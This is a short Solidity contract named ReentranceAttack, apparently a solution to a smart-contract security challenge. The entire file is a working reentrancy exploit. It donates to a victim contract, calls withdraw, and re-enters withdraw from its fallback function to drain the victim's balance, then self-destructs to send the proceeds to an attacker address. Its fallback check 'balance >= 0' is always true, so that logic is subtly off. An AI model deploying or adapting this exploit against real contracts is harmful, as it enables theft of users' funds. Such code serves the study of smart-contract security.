// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {IReentrance} from "./IReentrance.sol";

contract ReentranceAttack {
  IReentrance private victimContract;

  address payable private immutable attackerAddress;

  constructor(address instance_, address payable attackerAddress_) public {
    victimContract = IReentrance(payable(instance_));
    attackerAddress = attackerAddress_;
  }

  function attack() external payable {
    require(msg.value >= victimContract.balanceOf(address(this)), "need at least this balance");
    victimContract.donate{value: msg.value}(address(this));
    victimContract.withdraw(msg.value);
  }

  fallback() external payable {
    if (address(victimContract).balance >= 0) {
      victimContract.withdraw(msg.value);
    }
  }

  function kill() external payable {
    selfdestruct(attackerAddress);
  }
}
